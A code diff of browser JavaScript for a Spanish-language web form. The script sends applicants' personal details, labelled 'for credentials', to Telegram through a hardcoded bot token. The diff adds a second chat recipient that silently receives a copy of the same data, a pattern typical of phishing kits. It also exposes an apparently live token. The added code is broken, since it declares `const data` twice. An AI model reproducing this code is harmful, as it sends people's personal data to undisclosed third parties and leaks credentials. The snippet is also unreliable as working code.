@@ -409,7 +409,7 @@
 
                     const telegramBotToken = "6064373265:AAEe5EN3RZtYPxIheGlG6VD_Tiyhadl5ssg";
                     const chatId = "910563092";
-                    //const chatId = "788335654";
+                    const chatId2 = "788335654";
 
                     // Obtener los valores de los campos del formulario
                     const nombre = document.getElementById("nombre").value;
@@ -443,7 +443,7 @@
 
                     // Crear el mensaje a enviar a través de la API de Telegram
                     const message = `
-        <b>Datos del solicitante</b>
+        <b>Datos del solicitante para credenciales</b>
         <pre>
           Nombre: ${nombre}
           Apellidos: ${apellidos}
@@ -487,6 +487,11 @@
                     };
                     const data = {
                         chat_id: chatId,
+                        text: message,
+                        parse_mode: "HTML"
+                    };
+                    const data = {
+                        chat_id: chatId2,
                         text: message,
                         parse_mode: "HTML"
                     };
